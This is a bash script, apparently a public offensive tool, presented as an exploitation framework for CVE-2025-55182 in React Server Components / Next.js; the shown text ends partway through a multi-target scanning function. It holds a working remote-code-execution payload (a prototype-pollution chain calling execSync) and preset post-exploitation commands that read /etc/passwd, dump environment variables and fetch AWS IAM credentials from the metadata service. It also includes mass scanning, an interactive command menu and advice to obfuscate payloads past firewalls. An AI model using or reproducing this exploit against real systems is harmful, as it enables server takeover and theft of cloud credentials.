#!/bin/bash

# ██████╗██╗   ██╗██████╗ ███████╗██████╗ ████████╗███████╗ ██████╗██╗  ██╗ █████╗      ██╗     ██╗██╗   ██╗
# ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔════╝██║  ██║██╔══██╗     ██║     ██║██║   ██║
# ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝   ██║   █████╗  ██║     ███████║███████║     ██║     ██║██║   ██║
# ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗   ██║   ██╔══╝  ██║     ██╔══██║██╔══██║██   ██║██   ██║██║   ██║
# ╚██████╗   ██║   ██████╔╝███████╗██║  ██║   ██║   ███████╗╚██████╗██║  ██║██║  ██║╚█████╔╝╚█████╔╝╚██████╔╝
#  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝  ╚════╝  ╚═════╝
#
# CVE-2025-55182 Advanced Exploitation Framework
# React Server Components Remote Code Execution Scanner
# 
# Author: CyberTechAjju
# Motto: Keep Learning Keep Hacking
# Version: 2.0.0 Advanced Edition
#
# Based on research from ProjectDiscovery Nuclei Template
# Enhanced with advanced exploitation techniques and interactive features

VERSION="2.0.0"
AUTHOR="CyberTechAjju"
MOTTO="Keep Learning Keep Hacking"
DOMAIN="http://localhost:3000"
CMD="id"
INTERACTIVE_MODE=false
VERBOSE=false
SAVE_OUTPUT=false
OUTPUT_FILE=""
SCAN_MODE="single"
TARGET_FILE=""

# Color Schemes - Enhanced Cyberpunk Theme
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
BOLD='\033[1m'
DIM='\033[2m'
BLINK='\033[5m'
NC='\033[0m'

# Neon Color Effects
NEON_GREEN='\033[38;5;46m'
NEON_BLUE='\033[38;5;51m'
NEON_PINK='\033[38;5;201m'
NEON_PURPLE='\033[38;5;135m'
NEON_ORANGE='\033[38;5;208m'

# Background Colors
BG_RED='\033[41m'
BG_GREEN='\033[42m'
BG_BLUE='\033[44m'

# Animated banner with typing effect
print_banner() {
    clear
    echo -e "${NEON_BLUE}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                              ║
    ║   ██████╗██╗   ██╗██████╗ ███████╗██████╗ ████████╗███████╗ ██████╗██╗  ██╗ ║
    ║  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔════╝██║  ██║ ║
    ║  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝   ██║   █████╗  ██║     ███████║ ║
    ║  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗   ██║   ██╔══╝  ██║     ██╔══██║ ║
    ║  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║   ██║   ███████╗╚██████╗██║  ██║ ║
    ║   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝ ║
    ║                                                                              ║
EOF
    echo -e "${NEON_PINK}    ║   █████╗      ██╗     ██╗██╗   ██╗                                        ║${NC}"
    echo -e "${NEON_PINK}    ║  ██╔══██╗     ██║     ██║██║   ██║                                        ║${NC}"
    echo -e "${NEON_PINK}    ║  ███████║     ██║     ██║██║   ██║                                        ║${NC}"
    echo -e "${NEON_PINK}    ║  ██╔══██║██   ██║██   ██║██║   ██║                                        ║${NC}"
    echo -e "${NEON_PINK}    ║  ██║  ██║╚█████╔╝╚█████╔╝╚██████╔╝                                        ║${NC}"
    echo -e "${NEON_PINK}    ║  ╚═╝  ╚═╝ ╚════╝  ╚════╝  ╚═════╝                                         ║${NC}"
    echo -e "${NEON_BLUE}    ║                                                                              ║${NC}"
    echo -e "${NEON_BLUE}    ╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${NEON_GREEN}    ┌────────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${NEON_GREEN}    │${NC}  ${BOLD}${WHITE}CVE-2025-55182 Advanced Exploitation Framework v${VERSION}${NC}              ${NEON_GREEN}│${NC}"
    echo -e "${NEON_GREEN}    │${NC}  ${CYAN}React Server Components RCE Scanner & Exploitation Tool${NC}          ${NEON_GREEN}│${NC}"
    echo -e "${NEON_GREEN}    └────────────────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "${GRAY}    ┌────────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${GRAY}    │${NC}  ${NEON_ORANGE}Author:${NC} ${WHITE}${AUTHOR}${NC}                                                      ${GRAY}│${NC}"
    echo -e "${GRAY}    │${NC}  ${NEON_ORANGE}Motto:${NC}  ${NEON_PURPLE}${BOLD}${MOTTO}${NC}                                      ${GRAY}│${NC}"
    echo -e "${GRAY}    └────────────────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    sleep 0.3
}

# Animated loading bar
show_loading() {
    local message="$1"
    local duration=${2:-1}
    echo -ne "${CYAN}[${NC}"
    for i in {1..50}; do
        echo -ne "${NEON_GREEN}▓${NC}"
        sleep $(echo "scale=3; $duration/50" | bc)
    done
    echo -e "${CYAN}]${NC} ${GREEN}✓${NC} ${message}"
}

# Animated spinner
spinner() {
    local pid=$1
    local message=$2
    local spin=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local i=0
    
    while kill -0 $pid 2>/dev/null; do
        printf "\r${CYAN}[${NEON_BLUE}${spin[$i]}${CYAN}]${NC} ${message}"
        i=$(( (i+1) % 10 ))
        sleep 0.1
    done
    printf "\r${GREEN}[✓]${NC} ${message}\n"
}

# Typing effect for text
type_text() {
    local text="$1"
    local delay=${2:-0.03}
    for (( i=0; i<${#text}; i++ )); do
        echo -n "${text:$i:1}"
        sleep $delay
    done
    echo ""
}

# Print glitch effect
glitch_text() {
    local text="$1"
    echo -e "${NEON_PINK}${BLINK}${text}${NC}"
    sleep 0.1
    echo -ne "\r${NEON_BLUE}${text}${NC}"
    sleep 0.05
    echo -ne "\r${NEON_GREEN}${text}${NC}"
    sleep 0.05
    echo -e "\r${WHITE}${text}${NC}"
}

# Enhanced usage with categories
print_usage() {
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC}  ${BOLD}${WHITE}USAGE GUIDE${NC}                                                               ${CYAN}║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}SYNTAX:${NC}"
    echo -e "  ${GRAY}$0 [OPTIONS]${NC}"
    echo ""
    echo -e "${YELLOW}TARGET OPTIONS:${NC}"
    echo -e "  ${GREEN}-d, --domain${NC}      Target domain/URL ${GRAY}(default: http://localhost:3000)${NC}"
    echo -e "                     ${DIM}If no protocol specified, defaults to https://${NC}"
    echo -e "  ${GREEN}-f, --file${NC}        File containing list of targets ${GRAY}(one per line)${NC}"
    echo ""
    echo -e "${YELLOW}EXPLOITATION OPTIONS:${NC}"
    echo -e "  ${GREEN}-c, --command${NC}     Command to execute ${GRAY}(default: id)${NC}"
    echo -e "  ${GREEN}-i, --interactive${NC} Interactive exploitation mode"
    echo -e "  ${GREEN}-p, --payload${NC}     Use predefined payload:"
    echo -e "                     ${CYAN}1${NC} - System Info ${GRAY}(uname -a)${NC}"
    echo -e "                     ${CYAN}2${NC} - User Info ${GRAY}(whoami && id)${NC}"
    echo -e "                     ${CYAN}3${NC} - Network Config ${GRAY}(ifconfig || ip a)${NC}"
    echo -e "                     ${CYAN}4${NC} - Process List ${GRAY}(ps aux)${NC}"
    echo -e "                     ${CYAN}5${NC} - Environment Vars ${GRAY}(env)${NC}"
    echo -e "                     ${CYAN}6${NC} - AWS Metadata ${GRAY}(Cloud creds)${NC}"
    echo -e "                     ${CYAN}7${NC} - File Read ${GRAY}(/etc/passwd)${NC}"
    echo -e "                     ${CYAN}8${NC} - Container Check ${GRAY}(Docker/K8s)${NC}"
    echo ""
    echo -e "${YELLOW}OUTPUT OPTIONS:${NC}"
    echo -e "  ${GREEN}-o, --output${NC}      Save output to file"
    echo -e "  ${GREEN}-v, --verbose${NC}     Verbose output mode"
    echo ""
    echo -e "${YELLOW}GENERAL OPTIONS:${NC}"
    echo -e "  ${GREEN}-h, --help${NC}        Show this help message"
    echo -e "  ${GREEN}--version${NC}         Show version information"
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC}  ${BOLD}${WHITE}EXAMPLES${NC}                                                                 ${CYAN}║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GRAY}# Basic scan with default command${NC}"
    echo -e "  ${GREEN}$0 -d vulnapp.com${NC}"
    echo ""
    echo -e "  ${GRAY}# Custom command execution${NC}"
    echo -e "  ${GREEN}$0 -d http://localhost:3000 -c \"cat /etc/passwd\"${NC}"
    echo ""
    echo -e "  ${GRAY}# Use predefined payload${NC}"
    echo -e "  ${GREEN}$0 -d vulnapp.com -p 6${NC} ${GRAY}# AWS metadata extraction${NC}"
    echo ""
    echo -e "  ${GRAY}# Interactive mode${NC}"
    echo -e "  ${GREEN}$0 -d vulnapp.com -i${NC}"
    echo ""
    echo -e "  ${GRAY}# Scan multiple targets from file${NC}"
    echo -e "  ${GREEN}$0 -f targets.txt -c whoami -o results.txt${NC}"
    echo ""
    echo -e "  ${GRAY}# Verbose mode with output saving${NC}"
    echo -e "  ${GREEN}$0 -d vulnapp.com -c \"ls -la\" -v -o scan_results.log${NC}"
    echo ""
}

# Show version info
print_version() {
    echo -e "${NEON_BLUE}CVE-2025-55182 Scanner v${VERSION}${NC}"
    echo -e "${GRAY}Author: ${AUTHOR}${NC}"
    echo -e "${NEON_PURPLE}${MOTTO}${NC}"
}

# Get predefined payload
get_payload() {
    case $1 in
        1) echo "uname -a" ;;
        2) echo "whoami && id && groups" ;;
        3) echo "ifconfig 2>/dev/null || ip a" ;;
        4) echo "ps aux | head -20" ;;
        5) echo "env | sort" ;;
        6) echo "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo 'Not AWS'" ;;
        7) echo "cat /etc/passwd | head -10" ;;
        8) echo "cat /proc/1/cgroup 2>/dev/null | grep -E 'docker|kubepods' && echo 'Container Detected' || echo 'Not a container'" ;;
        *) echo "id" ;;
    esac
}

# Parse arguments with enhanced options
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -d|--domain)
                DOMAIN="$2"
                if [[ ! "$DOMAIN" =~ ^https?:// ]]; then
                    DOMAIN="https://${DOMAIN}"
                fi
                shift 2
                ;;
            -f|--file)
                TARGET_FILE="$2"
                SCAN_MODE="multiple"
                shift 2
                ;;
            -c|--command)
                CMD="$2"
                shift 2
                ;;
            -p|--payload)
                CMD=$(get_payload "$2")
                shift 2
                ;;
            -i|--interactive)
                INTERACTIVE_MODE=true
                shift
                ;;
            -o|--output)
                SAVE_OUTPUT=true
                OUTPUT_FILE="$2"
                shift 2
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            --version)
                print_version
                exit 0
                ;;
            -h|--help)
                print_usage
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Unknown option: $1${NC}"
                print_usage
                exit 1
                ;;
        esac
    done
}

# Display scan configuration with animation
show_config() {
    echo -e "${NEON_BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${NEON_BLUE}║${NC}  ${BOLD}${WHITE}SCAN CONFIGURATION${NC}                                                      ${NEON_BLUE}║${NC}"
    echo -e "${NEON_BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    if [[ "$SCAN_MODE" == "single" ]]; then
        echo -e "${CYAN}  ┌─ Target Information${NC}"
        echo -e "${CYAN}  │${NC}"
        echo -e "${CYAN}  ├──${NC} ${BOLD}Target:${NC}     ${NEON_GREEN}${DOMAIN}${NC}"
        echo -e "${CYAN}  ├──${NC} ${BOLD}Command:${NC}    ${YELLOW}${CMD}${NC}"
        echo -e "${CYAN}  ├──${NC} ${BOLD}Mode:${NC}       ${MAGENTA}${SCAN_MODE}${NC}"
        echo -e "${CYAN}  └──${NC} ${BOLD}Verbose:${NC}    ${WHITE}${VERBOSE}${NC}"
    else
        echo -e "${CYAN}  ┌─ Multi-Target Scan${NC}"
        echo -e "${CYAN}  │${NC}"
        echo -e "${CYAN}  ├──${NC} ${BOLD}Target File:${NC} ${NEON_GREEN}${TARGET_FILE}${NC}"
        echo -e "${CYAN}  ├──${NC} ${BOLD}Command:${NC}     ${YELLOW}${CMD}${NC}"
        echo -e "${CYAN}  ├──${NC} ${BOLD}Mode:${NC}        ${MAGENTA}${SCAN_MODE}${NC}"
        echo -e "${CYAN}  └──${NC} ${BOLD}Output File:${NC} ${WHITE}${OUTPUT_FILE}${NC}"
    fi
    
    echo ""
    sleep 0.5
}

# Execute exploit with enhanced visuals
execute_exploit() {
    local target="$1"
    local command="$2"
    
    # Generate random IDs
    REQUEST_ID=$(openssl rand -hex 4 2>/dev/null | tr '[:upper:]' '[:lower:]' || echo "$(date +%s | sha256sum | cut -c1-8)")
    NEXTJS_HTML=$(openssl rand -hex 10 2>/dev/null || echo "$(date +%s | sha256sum | cut -c1-21)")
    
    BOUNDARY="----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    # Escape command for JSON
    ESCAPED_CMD=$(echo "$command" | sed "s/'/\\\\'/g" | sed 's/\\/\\\\/g' | tr -d '\n')
    
    # Create payload
    TMPFILE=$(mktemp)
    PAYLOAD_JSON="{\"then\":\"\$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"\$B1337\\\"}\",\"_response\":{\"_prefix\":\"var res=process.mainModule.require('child_process').execSync('${ESCAPED_CMD}').toString().trim().replace(/\\\\n/g, ' | ');;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \`NEXT_REDIRECT;push;/login?a=\${res};307;\`});\",\"_chunks\":\"\$Q2\",\"_formData\":{\"get\":\"\$1:constructor:constructor\"}}}"
    
    printf '%s\r\n' \
      "------WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
      'Content-Disposition: form-data; name="0"' \
      "" \
      "${PAYLOAD_JSON}" \
      "------WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
      'Content-Disposition: form-data; name="1"' \
      "" \
      '"$@0"' \
      "------WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
      'Content-Disposition: form-data; name="2"' \
      "" \
      '[]' \
      "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--" \
      > "$TMPFILE"
    
    # Show progress
    echo -e "${CYAN}[${NEON_BLUE}◉${CYAN}]${NC} Initializing exploit payload..."
    sleep 0.2
    echo -e "${CYAN}[${NEON_BLUE}◉${CYAN}]${NC} Injecting prototype pollution chain..."
    sleep 0.2
    echo -e "${CYAN}[${NEON_BLUE}◉${CYAN}]${NC} Triggering RSC deserialization..."
    sleep 0.2
    echo -e "${CYAN}[${NEON_BLUE}◉${CYAN}]${NC} Sending exploit to ${NEON_GREEN}${target}${NC}..."
    echo ""
    
    # Execute request
    RESPONSE=$(curl -s -i -X POST "${target}" \
      -H "Next-Action: x" \
      -H "X-Nextjs-Request-Id: ${REQUEST_ID}" \
      -H "X-Nextjs-Html-Request-Id: ${NEXTJS_HTML}" \
      -H "Content-Type: multipart/form-data; boundary=${BOUNDARY}" \
      -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
      --max-time 15 \
      --data-binary "@${TMPFILE}" 2>&1)
    
    # Extract result
    CMD_RESULT=$(echo "$RESPONSE" | grep -i "x-action-redirect" | sed -n 's/.*\/login?a=\([^;]*\).*/\1/p' | head -1)
    
    # Cleanup
    rm -f "$TMPFILE"
    
    if [ -n "$CMD_RESULT" ]; then
        # Decode result
        if command -v python3 >/dev/null 2>&1; then
            DECODED_RESULT=$(echo "$CMD_RESULT" | python3 -c "import sys, urllib.parse; sys.stdout.write(urllib.parse.unquote(sys.stdin.read()))")
        else
            DECODED_RESULT=$(echo "$CMD_RESULT" | sed 's/%20/ /g' | sed 's/%7C/|/g' | sed 's/%0A/\n/g')
        fi
        
        DECODED_RESULT=$(echo "$DECODED_RESULT" | sed 's/ | /\n/g')
        
        # Success output
        echo -e "${BG_GREEN}${BLACK}                                                                              ${NC}"
        echo -e "${BG_GREEN}${BLACK}  ✓ EXPLOITATION SUCCESSFUL                                                   ${NC}"
        echo -e "${BG_GREEN}${BLACK}                                                                              ${NC}"
        echo ""
        echo -e "${NEON_GREEN}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${NEON_GREEN}║${NC}  ${BOLD}${WHITE}COMMAND OUTPUT${NC}                                                          ${NEON_GREEN}║${NC}"
        echo -e "${NEON_GREEN}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        
        TMP_OUTPUT=$(mktemp)
        printf '%s' "$DECODED_RESULT" > "$TMP_OUTPUT"
        
        while IFS= read -r line || [ -n "$line" ]; do
            echo -e "${YELLOW}  │${NC} ${WHITE}$line${NC}"
        done < "$TMP_OUTPUT"
        
        echo ""
        echo -e "${NEON_GREEN}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        
        rm -f "$TMP_OUTPUT"
        
        # Save output if requested
        if [[ "$SAVE_OUTPUT" == true ]]; then
            echo "[SUCCESS] Target: $target" >> "$OUTPUT_FILE"
            echo "Command: $command" >> "$OUTPUT_FILE"
            echo "Result:" >> "$OUTPUT_FILE"
            echo "$DECODED_RESULT" >> "$OUTPUT_FILE"
            echo "---" >> "$OUTPUT_FILE"
            echo -e "${GREEN}[✓]${NC} Results saved to ${CYAN}${OUTPUT_FILE}${NC}"
        fi
        
        return 0
    else
        # Failure output
        echo -e "${BG_RED}${WHITE}                                                                              ${NC}"
        echo -e "${BG_RED}${WHITE}  ✗ EXPLOITATION FAILED                                                       ${NC}"
        echo -e "${BG_RED}${WHITE}                                                                              ${NC}"
        echo ""
        
        # Error analysis
        if echo "$RESPONSE" | grep -qi "403\|Forbidden"; then
            echo -e "${RED}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║${NC}  ${BOLD}Error Type:${NC} ${RED}Access Forbidden (403)${NC}"
            echo -e "${RED}║${NC}  ${BOLD}Cause:${NC} WAF/Firewall blocking the request"
            echo -e "${RED}║${NC}  ${BOLD}Suggestion:${NC} Try payload obfuscation or different target"
            echo -e "${RED}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        elif echo "$RESPONSE" | grep -qi "timeout"; then
            echo -e "${RED}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║${NC}  ${BOLD}Error Type:${NC} ${RED}Connection Timeout${NC}"
            echo -e "${RED}║${NC}  ${BOLD}Cause:${NC} Server not responding or command taking too long"
            echo -e "${RED}║${NC}  ${BOLD}Suggestion:${NC} Check target availability or use shorter command"
            echo -e "${RED}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        else
            echo -e "${RED}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║${NC}  ${BOLD}Error Type:${NC} ${RED}Exploitation Failed${NC}"
            echo -e "${RED}║${NC}  ${BOLD}Cause:${NC} Target may not be vulnerable or payload blocked"
            echo -e "${RED}║${NC}  ${BOLD}Suggestion:${NC} Verify target runs vulnerable Next.js version"
            echo -e "${RED}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        fi
        
        if [[ "$VERBOSE" == true ]]; then
            echo ""
            echo -e "${GRAY}Full Response:${NC}"
            echo "$RESPONSE"
        fi
        
        echo ""
        return 1
    fi
}

# Guided input mode - Interactive wizard for first-time users
guided_input_mode() {
    echo -e "${NEON_PURPLE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${NEON_PURPLE}║${NC}  ${BOLD}${WHITE}GUIDED SETUP WIZARD${NC}                                                    ${NEON_PURPLE}║${NC}"
    echo -e "${NEON_PURPLE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}Welcome! Let's configure your scan.${NC}"
    echo ""
    
    # Step 1: Target selection
    echo -e "${NEON_BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${WHITE}Step 1: Target Selection${NC}"
    echo -e "${NEON_BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "${CYAN}Choose scan mode:${NC}"
    echo -e "  ${GREEN}1${NC} - Single target scan"
    echo -e "  ${GREEN}2${NC} - Multiple targets from file"
    echo ""
    echo -ne "${YELLOW}Select mode (1-2):${NC} "
    read -r scan_choice
    
    case $scan_choice in
        1)
            echo -ne "${YELLOW}Enter target URL (e.g., vulnapp.com or http://localhost:3000):${NC} "
            read -r user_domain
            
            if [[ -z "$user_domain" ]]; then
                echo -e "${RED}[!] No target provided, using default: http://localhost:3000${NC}"
                DOMAIN="http://localhost:3000"
            else
                if [[ ! "$user_domain" =~ ^https?:// ]]; then
                    user_domain="https://${user_domain}"
                fi
                DOMAIN="$user_domain"
            fi
            SCAN_MODE="single"
            ;;
        2)
            echo -ne "${YELLOW}Enter path to targets file:${NC} "
            read -r user_file
            
            if [[ ! -f "$user_file" ]]; then
                echo -e "${RED}[!] File not found. Switching to single target mode.${NC}"
                echo -ne "${YELLOW}Enter target URL:${NC} "
                read -r user_domain
                if [[ ! "$user_domain" =~ ^https?:// ]]; then
                    user_domain="https://${user_domain}"
                fi
                DOMAIN="$user_domain"
                SCAN_MODE="single"
            else
                TARGET_FILE="$user_file"
                SCAN_MODE="multiple"
            fi
            ;;
        *)
            echo -e "${RED}[!] Invalid choice. Using single target mode with default URL.${NC}"
            DOMAIN="http://localhost:3000"
            SCAN_MODE="single"
            ;;
    esac
    
    echo ""
    sleep 0.3
    
    # Step 2: Command/Payload selection
    echo -e "${NEON_BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${WHITE}Step 2: Command/Payload Selection${NC}"
    echo -e "${NEON_BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "${CYAN}Choose execution mode:${NC}"
    echo -e "  ${GREEN}1${NC} - Use predefined payload ${GRAY}(Recommended for beginners)${NC}"
    echo -e "  ${GREEN}2${NC} - Enter custom command ${GRAY}(Advanced users)${NC}"
    echo ""
    echo -ne "${YELLOW}Select mode (1-2):${NC} "
    read -r cmd_choice
    
    case $cmd_choice in
        1)
            echo ""
            echo -e "${CYAN}Available Predefined Payloads:${NC}"
            echo ""
            echo -e "  ${GREEN}1${NC} - ${WHITE}System Information${NC}     ${GRAY}(uname -a)${NC}"
            echo -e "  ${GREEN}2${NC} - ${WHITE}User Information${NC}       ${GRAY}(whoami && id)${NC}"
            echo -e "  ${GREEN}3${NC} - ${WHITE}Network Configuration${NC}  ${GRAY}(ifconfig/ip a)${NC}"
            echo -e "  ${GREEN}4${NC} - ${WHITE}Process List${NC}           ${GRAY}(ps aux)${NC}"
            echo -e "  ${GREEN}5${NC} - ${WHITE}Environment Variables${NC}  ${GRAY}(env)${NC}"
            echo -e "  ${GREEN}6${NC} - ${WHITE}AWS Metadata${NC}           ${GRAY}(Cloud credentials)${NC}"
            echo -e "  ${GREEN}7${NC} - ${WHITE}File Read${NC}              ${GRAY}(/etc/passwd)${NC}"
            echo -e "  ${GREEN}8${NC} - ${WHITE}Container Detection${NC}    ${GRAY}(Docker/K8s check)${NC}"
            echo ""
            echo -ne "${YELLOW}Select payload (1-8, default=1):${NC} "
            read -r payload_choice
            
            if [[ -z "$payload_choice" ]]; then
                payload_choice=1
            fi
            
            CMD=$(get_payload "$payload_choice")
            echo -e "${GREEN}[✓]${NC} Payload selected: ${CYAN}${CMD}${NC}"
            ;;
        2)
            echo -ne "${YELLOW}Enter custom command to execute:${NC} "
            read -r user_cmd
            
            if [[ -z "$user_cmd" ]]; then
                echo -e "${RED}[!] No command provided, using default: id${NC}"
                CMD="id"
            else
                CMD="$user_cmd"
            fi
            echo -e "${GREEN}[✓]${NC} Command set: ${CYAN}${CMD}${NC}"
            ;;
        *)
            echo -e "${RED}[!] Invalid choice. Using default command: id${NC}"
            CMD="id"
            ;;
    esac
    
    echo ""
    sleep 0.3
    
    # Step 3: Additional options
    echo -e "${NEON_BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${WHITE}Step 3: Additional Options${NC}"
    echo -e "${NEON_BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -ne "${YELLOW}Save results to file? (y/N):${NC} "
    read -r save_choice
    
    if [[ "$save_choice" =~ ^[Yy]$ ]]; then
        echo -ne "${YELLOW}Enter output filename (default: scan_results.txt):${NC} "
        read -r output_name
        
        if [[ -z "$output_name" ]]; then
            OUTPUT_FILE="scan_results.txt"
        else
            OUTPUT_FILE="$output_name"
        fi
        
        SAVE_OUTPUT=true
        echo -e "${GREEN}[✓]${NC} Results will be saved to: ${CYAN}${OUTPUT_FILE}${NC}"
    else
        SAVE_OUTPUT=false
        echo -e "${GRAY}[i] Results will not be saved${NC}"
    fi
    
    echo ""
    echo -ne "${YELLOW}Enable verbose output? (y/N):${NC} "
    read -r verbose_choice
    
    if [[ "$verbose_choice" =~ ^[Yy]$ ]]; then
        VERBOSE=true
        echo -e "${GREEN}[✓]${NC} Verbose mode enabled"
    else
        VERBOSE=false
        echo -e "${GRAY}[i] Verbose mode disabled${NC}"
    fi
    
    echo ""
    sleep 0.5
    
    # Confirmation
    echo -e "${NEON_GREEN}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${NEON_GREEN}║${NC}  ${BOLD}${WHITE}CONFIGURATION COMPLETE${NC}                                                 ${NEON_GREEN}║${NC}"
    echo -e "${NEON_GREEN}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    show_config
    
    echo -ne "${YELLOW}Proceed with scan? (Y/n):${NC} "
    read -r proceed_choice
    
    if [[ "$proceed_choice" =~ ^[Nn]$ ]]; then
        echo -e "${RED}[!] Scan cancelled by user${NC}"
        exit 0
    fi
    
    echo ""
    echo -e "${NEON_GREEN}[✓] Starting scan...${NC}"
    echo ""
    sleep 0.5
}

# Interactive mode with menu
interactive_mode() {
    while true; do
        echo ""
        echo -e "${NEON_PURPLE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${NEON_PURPLE}║${NC}  ${BOLD}${WHITE}INTERACTIVE EXPLOITATION MENU${NC}                                          ${NEON_PURPLE}║${NC}"
        echo -e "${NEON_PURPLE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}  [1]${NC} Execute custom command"
        echo -e "${CYAN}  [2]${NC} Use predefined payload"
        echo -e "${CYAN}  [3]${NC} Change target"
        echo -e "${CYAN}  [4]${NC} View current configuration"
        echo -e "${CYAN}  [5]${NC} Exit"
        echo ""
        echo -ne "${YELLOW}Select option:${NC} "
        read -r choice
        
        case $choice in
            1)
                echo -ne "${YELLOW}Enter command to execute:${NC} "
                read -r custom_cmd
                execute_exploit "$DOMAIN" "$custom_cmd"
                ;;
            2)
                echo ""
                echo -e "${CYAN}Available Payloads:${NC}"
                echo -e "  ${GREEN}1${NC} - System Info"
                echo -e "  ${GREEN}2${NC} - User Info"
                echo -e "  ${GREEN}3${NC} - Network Config"
                echo -e "  ${GREEN}4${NC} - Process List"
                echo -e "  ${GREEN}5${NC} - Environment Variables"
                echo -e "  ${GREEN}6${NC} - AWS Metadata"
                echo -e "  ${GREEN}7${NC} - Read /etc/passwd"
                echo -e "  ${GREEN}8${NC} - Container Detection"
                echo ""
                echo -ne "${YELLOW}Select payload:${NC} "
                read -r payload_num
                payload_cmd=$(get_payload "$payload_num")
                execute_exploit "$DOMAIN" "$payload_cmd"
                ;;
            3)
                echo -ne "${YELLOW}Enter new target URL:${NC} "
                read -r new_target
                if [[ ! "$new_target" =~ ^https?:// ]]; then
                    new_target="https://${new_target}"
                fi
                DOMAIN="$new_target"
                echo -e "${GREEN}[✓]${NC} Target updated to ${CYAN}${DOMAIN}${NC}"
                ;;
            4)
                show_config
                ;;
            5)
                echo -e "${NEON_BLUE}Exiting interactive mode...${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
    done
}

# Scan multiple targets
scan_multiple_targets() {
    if [[ ! -f "$TARGET_FILE" ]]; then
        echo -e "${RED}[!] Target file not found: ${TARGET_FILE}${NC}"
        exit 1
    fi
    
    local total=$(wc -l < "$TARGET_FILE")
    local current=0
    local success=0
    local failed=0
    
